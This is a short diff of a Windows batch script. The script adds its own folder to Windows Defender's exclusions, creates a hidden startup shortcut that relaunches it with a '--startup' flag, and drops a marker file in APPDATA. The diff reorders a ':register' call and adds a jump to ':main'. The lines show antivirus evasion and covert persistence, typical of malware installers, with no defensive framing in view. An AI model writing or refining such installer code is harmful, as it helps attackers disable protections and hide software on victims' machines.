@@ -45,9 +45,11 @@ if exist "%APPDATA%\%scriptName%.dat" exit /b
 
 powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'" 2>nul
 if !ERRORLEVEL! EQU 0 (
-  call :register
   powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%shortcutPath%'); $Shortcut.TargetPath = '%~f0'; $Shortcut.Arguments = '--startup'; $Shortcut.WindowStyle = 7; $Shortcut.Save()"
   echo installed > "%APPDATA%\%scriptName%.dat"
+  
+  call :register
+  goto :main
 )
 exit /b
 
